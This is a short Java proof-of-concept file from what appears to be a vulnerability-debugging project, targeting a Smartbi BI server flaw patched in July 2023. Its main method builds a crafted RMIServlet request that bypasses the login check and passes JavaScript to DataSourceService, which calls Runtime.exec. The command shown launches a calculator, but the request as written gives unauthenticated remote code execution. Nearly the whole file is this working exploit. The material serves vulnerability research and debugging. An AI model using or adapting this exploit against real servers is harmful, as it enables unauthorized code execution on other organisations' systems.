package cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;
import java.net.URLEncoder;

/**
 * 漏洞：
 * https://www.smartbi.com.cn/patchinfo
 * 2023-07-03  修复登录代码逻辑漏洞
 *
 * 关键调试类和方法：
 * smartbi.freequery.filter.CheckIsLoggedFilter#doFilter
 * smartbi.util.FilterUtil#needToCheck
 * smartbi.framework.rmi.RMIServlet#doPost
 * smartbi.freequery.client.datasource.DataSourceService#getJavaQueryDataParamsAndFields
 */
public class PATCH_20230703 {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.201:18080/smartbi/vision/RMIServlet?windowUnloading=&";
        String queryString;
        queryString = "className=UserService&methodName=checkVersion&params=[]";
        queryString = URLEncoder.encode(queryString,"UTF-8");
        String body = "className=DataSourceService&methodName=getJavaQueryDataParamsAndFields&params=[\"smartbi.JavaScriptJavaQuery\",{\"javaScript\":\"importClass(java.lang.Runtime);var runtime = Runtime.getRuntime();runtime.exec('calc');\"},\"AP_WARNING_STYLE_SETTING\"]";

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url + queryString);
        httpPost.addHeader("Content-Type","application/x-www-form-urlencoded");
        Response response = httpRequest.sendStringPost(httpPost, body);
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());

    }
}
